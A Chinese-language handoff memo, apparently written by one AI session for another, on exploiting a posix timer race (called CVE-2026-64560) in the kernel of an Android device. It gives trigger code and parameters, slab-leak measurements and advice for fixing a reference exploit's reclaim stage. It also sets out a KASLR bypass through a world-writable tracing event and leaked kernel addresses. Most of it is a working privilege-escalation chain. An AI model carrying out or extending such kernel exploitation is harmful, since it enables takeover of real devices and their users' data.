# 给新对话的一条情报（可直接粘贴）

> 来自上一个会话的实测数据，用于对照参考实现在 lhasa 上的命中率问题。

---

## 一句话

**CVE-2026-64560 的竞态在 lhasa（XRing O3）上能打中——我实测到了持久泄漏。如果你跑 407 次 `leaks=0`，先别怀疑漏洞不存在，更可能是 `leaks` 的计数口径问题，或者参数需要针对 XRing 重新标定。**

---

## 我的实测数据（同一台设备，同一个 boot 无关）

用自己写的 PoC：`runs/android/research/cve64560_probe3.c`
编译：`zig cc -target aarch64-linux-musl -static -O2 -pthread`
部署：`/data/local/tmp/cve64560_probe3`

**运行参数**：
```
/data/local/tmp/cve64560_probe3 40 400 8 4
                                  │  │   │ └─ 4 个 deleter 线程分摊删除
                                  │  │   └─── 8 个并发 victim
                                  │  └─────── 每个 victim 400 个 timer
                                  └────────── 40 轮
```

**判据**（直接读 `/proc/slabinfo`，shell 可读）：
```bash
adb shell "grep '^posix_timers_cache' /proc/slabinfo"
# 格式：name active total objsize objperslab pagesperslab : ... slabdata ...
```

**实测结果**：

```
空闲基线            posix_timers_cache    420    630    384   21    2
运行后立刻           posix_timers_cache   1877   2268    384   21    2
等 5 秒              posix_timers_cache    504    693    384   21    2
等 10 秒             posix_timers_cache    504    693    384   21    2   ← 稳定不回落

持久泄漏 = +84
```

**关键点：等 5 秒和 10 秒后数值完全一致（504/693），不回收。**

正常的 `posix_cpu_timers_exit` 清理路径会把它们全部释放回基线。这 +84 就是**悬空 rb_node 留在 timerqueue 上**的直接证据。

---

## 我的触发设计（和参考实现的差异）

```c
// 1. 先 arm 400 个 timer（远期 it_value.tv_sec = 3600，让节点常驻 rbtree）
for (i = 0; i < 400; i++) {
    timer_create(CLOCK_PROCESS_CPUTIME_ID, &ev, &tids[i]);
    timer_settime(tids[i], 0, &its, NULL);
}

// 2. 先创建 worker 线程，但让它阻塞在 g_release 上
pthread_create(&wth, NULL, exec_worker, NULL);   // execve("/system/bin/true")

// 3. ★ 先把 400 个 timer 切给 4 个 deleter 线程，让它们开始 hammer
for (t = 0; t < 4; t++)
    pthread_create(&delths[t], NULL, delete_storm, &da[t]);

// 4. ★ 等 deleter 都跑起来了，才放 execve 进去
while (g_del_started < 4) sched_yield();
g_release = 1;
```

**两个关键设计**：

1. **没有 `sched_yield()` 给 execve 让路**——恰恰相反，是**让 delete 风暴先跑起来，再把 execve 释放进去**。因为窗口在 `de_thread() → release_task(old_leader) → sighand = NULL` 之后、task 内存回收之前，delete 必须**已经在路上**才能落进去。

2. **多个 deleter 线程并行**——单个线程跑 400 次 `timer_delete` 太快，容易整体错过窗口；4 个线程分摊后，删除请求在时间上是铺开的。

**反例（我早期版本的错误）**：如果先 `g_release = 1` 再 `sched_yield()` 然后才 delete，`execve` 会先把其他线程全部 zap 掉，delete 根本跑不完——实测 slab 会从 420 涨到 865/1344，那是"timer 没被删"的假泄漏，不是 UAF。

---

## 对你 `leaks=0` 的判断

你现在的日志：

```
v33a:  victims=16 timers=6400 drained=1 slab=485/630 frag=6000 leaks=0    ×300
l60:   frac=20~95% del_ok=24000 drained=0/1 frag=8000 leaks=0             ×107
```

**三种可能，按概率排序**：

### 1. `leaks` 计数口径不同（最可能）

参考实现的 `t64560_v33` 里，`leaks` 很可能统计的是**"落地页被我们的 frag 接管"的次数**（即 `__rb_erase_augmented` 触发后从 `recv(MSG_PEEK)` 读回页地址成功），而不是"slab 有悬空节点"。

如果口径是这样，那 `leaks=0` 只说明**重占（frag spray）没成功**，不说明竞态没打中。悬空节点可能已经有了。

**验证方法**（不用改代码，一条命令）：
```bash
# 跑完后等 5 秒，看 active 是否回落到基线
adb shell "/data/local/tmp/t64560_v33 100 400 16 6000 12000 <T>"
sleep 5
adb shell "grep '^posix_timers_cache' /proc/slabinfo"
# 如果 active 明显高于空闲基线且不回落 → 悬空节点存在，问题在重占而非竞态
```

我这边空闲基线是 `420/630`，你可以先测一个稳定基线做对照。

### 2. 排空门太严（`drained` 判据）

你的日志里 `drained=0` 占了相当比例（`l60` 里大约一半）。参考实现的严格门是「active/total 回落到 基线+64」，宽松门是「active<1200 && total<1200 等 8s」。

在 lhasa 上系统自身计时器可能让 active 漂移更快，严格门容易一直不满足。可以考虑放宽到「基线+128」或直接用宽松门。

### 3. XRing O3 的调度时序不同

参考实现的目标是 SM8950（8 核），lhasa 是 XRing O3（**10 核**，从 trace 的 `#P:10` 可以确认）。`de_thread()` 与 `timer_delete` 的交错窗口宽度受 CPU 数、调度延迟、`preempt` 模式影响。

**如果 1 和 2 都排除了，就回到我的参数试一次**：`400 timers × 8 并发 × 4 deleter`，先确认能不能复现 +84 泄漏。能复现就说明竞态没问题，问题在后续的重占/写原语阶段。

---

## 顺手可用的两个环境事实

```bash
# 1. slabinfo 完全可读，是精确 oracle
adb shell "grep '^posix_timers_cache' /proc/slabinfo"

# 2. sched_blocked_reason 的 enable 是 0666，shell 直接可写（不需要 code 7）
adb shell "ls -l /sys/kernel/tracing/events/sched/sched_blocked_reason/enable"
# -rw-rw-rw- 1 root readtracefs
adb shell "echo 1 > /sys/kernel/tracing/events/sched/sched_blocked_reason/enable"
# raw payload: offset 8 = pid, offset 16 = u64 caller（裸地址，不 hash）
```

第二条对 KASLR 有用——`per_cpu/cpuN/trace_pipe_raw` 是 `root:readtracefs 0440`，shell 在 3012 组，可读。

---

## 我这边已知的一个硬约束（供你算 slide 用）

`slide` 必须 **2MB 对齐**（`SLIDE_ALIGN = 0x200000`），`KIMAGE_BASE = 0xffffffc080000000`。

用 trace 抓到的 raw 地址（`0xffffffe9f09aa2a8` 最常见，对应文本 `worker_thread+0x248`）配合 2MB 对齐约束，已把候选压到 **33 个**（`0x296c800000 ~ 0x2970800000`）；如果把 `.text` 窗口从 64MB 缩到 32MB，可降到约 6 个。

脚本：`runs/android/bootstrap_slide.py`
原始数据：`runs/android/research/bl_0.bin`、`bl_4.bin`、`bl_text.txt`

如果你已经有 vmlinux 了，直接用参考实现的 `tools/slide_now.py` 更准。
